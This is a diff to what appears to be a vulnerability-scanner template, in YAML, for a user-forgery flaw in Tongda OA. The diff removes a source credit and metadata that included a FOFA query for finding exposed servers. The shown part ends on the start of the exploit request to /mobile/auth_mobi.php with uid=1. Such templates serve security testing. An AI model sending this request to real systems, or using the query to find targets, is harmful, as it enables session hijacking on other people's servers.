@@ -3,12 +3,8 @@ info:
   name: 通达OA auth_mobi在线用户伪造漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lsye752x4szs9b3g'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lsye752x4szs9b3g
-    fofa: title="office Anywhere" && icon_hash="-759108386" && "2017"
 http:
 - raw:
   - 'GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1
